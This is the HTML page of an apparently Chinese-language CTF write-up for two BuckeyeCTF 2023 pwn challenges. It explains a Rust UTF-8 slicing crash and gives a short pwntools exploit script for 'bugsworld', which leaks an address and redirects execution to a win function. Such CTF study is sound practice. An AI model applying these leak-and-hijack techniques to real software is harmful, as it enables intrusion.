@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="rust入门级pwn,">
+<meta property="og:type" content="article">
+<meta property="og:title" content="buckeyectf-2023">
+<meta property="og:url" content="http://example.com/2023/10/10/buckeyectf-2023/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="rust入门级pwn,">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2023/10/10/buckeyectf-2023/Snipaste_2023-10-10_10-52-20.png">
+<meta property="article:published_time" content="2023-10-10T02:14:02.000Z">
+<meta property="article:modified_time" content="2023-10-10T07:39:59.560Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/10/10/buckeyectf-2023/Snipaste_2023-10-10_10-52-20.png">
+
+<link rel="canonical" href="http://example.com/2023/10/10/buckeyectf-2023/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>buckeyectf-2023 | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/10/buckeyectf-2023/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          buckeyectf-2023
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-10-10 10:14:02 / Modified: 15:39:59" itemprop="dateCreated datePublished" datetime="2023-10-10T10:14:02+08:00">2023-10-10</time>
+            </span>
+
+          
+            <div class="post-description">rust入门级pwn,</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="Igpay-Atinlay-Natoriay"><a href="#Igpay-Atinlay-Natoriay" class="headerlink" title="Igpay Atinlay Natoriay"></a>Igpay Atinlay Natoriay</h1><p>给了一个rs文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">use std::io::&#123;self, Read, BufRead&#125;;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let input = loop &#123;</span><br><span class="line">        match get_line() &#123;</span><br><span class="line">            Ok(my_str) =&gt; break my_str,</span><br><span class="line">            Err(_) =&gt; &#123;</span><br><span class="line">                print!(&quot;Try again.&quot;);</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    let mut output = String::new();</span><br><span class="line"></span><br><span class="line">    for word in input.split_whitespace() &#123;</span><br><span class="line">        let first = &amp;word[0..1];</span><br><span class="line">        let rest = &amp;word[1..];</span><br><span class="line"></span><br><span class="line">        output += rest;</span><br><span class="line">        output += first;</span><br><span class="line">        output += &quot;ay&quot;;</span><br><span class="line">        output += &quot; &quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    print!(&quot;&#123;output&#125;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn get_line() -&gt; Result&lt;String, io::Error&gt; &#123;</span><br><span class="line">    let mut input = String::new();</span><br><span class="line"></span><br><span class="line">    io::BufReader::new(io::stdin().take(1862)).read_line(&amp;mut input)?;</span><br><span class="line"></span><br><span class="line">    Ok(input)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>还有一个sh文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"></span><br><span class="line">./igpay-atinlay-natoriay-3000 \</span><br><span class="line">    || printf &quot;You crashed my program :(\n$FLAG&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以看到，当rust程序崩溃时就会打印出flag</p>
+<p>再来分析rust程序，</p>
+<p>允许我们输入一串字符串，同时将字符串的第一个字节移动到字符串的最后。</p>
+<p>看起来是没有什么可利用的bug</p>
+<p>但是rust是采用utf-8的，很明显，utf-8是一种变长编码，对于英文和常用的符号，确实是只有一个字节，但是对于中文和其他符号，就不止一个字节了。</p>
+<p>那么在rust尝试分离一个字符的一个字节时，就会出现错误，从而导致程序崩溃。</p>
+<p><img src="/2023/10/10/buckeyectf-2023/Snipaste_2023-10-10_10-52-20.png"></p>
+<h1 id="bugsworld"><a href="#bugsworld" class="headerlink" title="bugsworld"></a>bugsworld</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&quot;debug&quot;</span><br><span class="line">context.arch=&quot;amd64&quot;</span><br><span class="line"></span><br><span class="line">r=process(&quot;./pwn&quot;)</span><br><span class="line">elf=ELF(&quot;./pwn&quot;)</span><br><span class="line"></span><br><span class="line">def send_content(content):</span><br><span class="line">    r.recvuntil(b&quot;&gt; &quot;)</span><br><span class="line">    r.sendline(str(len(content)).encode())</span><br><span class="line">    r.recvuntil(b&quot;&gt; &quot;)</span><br><span class="line">    r.sendline(&quot; &quot;.join(str(x) for x in content).encode())</span><br><span class="line"></span><br><span class="line">send_content([(elf.sym[&quot;instruction_table&quot;]-elf.sym[&quot;instruction_names&quot;])//32])         #泄露出do_move</span><br><span class="line">#do_move_addr=u64(r.recvuntil(&quot;&quot;))</span><br><span class="line">do_move_addr=u64(r.recvuntil(&quot;I&quot;,drop=True).ljust(8,b&quot;\x00&quot;))</span><br><span class="line">print(&quot;do_move_addr---&gt;&quot;+hex(do_move_addr))</span><br><span class="line">base=do_move_addr-elf.sym[&quot;do_move&quot;]</span><br><span class="line">win_addr=base+elf.sym[&quot;win&quot;]</span><br><span class="line">win_pointer_addr=(elf.sym[&quot;bytecode&quot;]+4*8-elf.sym[&quot;instruction_table&quot;])//8</span><br><span class="line">send_content([6,3,28,win_pointer_addr,win_addr])#将win_addr存放在bytecode[4]</span><br><span class="line">send_content([6,3])#利用do_jump,使table[code[]]指向win_addr并执行，从而获取到flag</span><br><span class="line">r.recvall(timeout=1)</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/09/22/csaw-2023-qual/" rel="prev" title="csaw_2023_qual">
+      <i class="fa fa-chevron-left"></i> csaw_2023_qual
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/10/11/SWPU-2019-p1kkheap/" rel="next" title="SWPU 2019 p1kkheap">
+      SWPU 2019 p1kkheap <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Igpay-Atinlay-Natoriay"><span class="nav-number">1.</span> <span class="nav-text">Igpay Atinlay Natoriay</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#bugsworld"><span class="nav-number">2.</span> <span class="nav-text">bugsworld</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
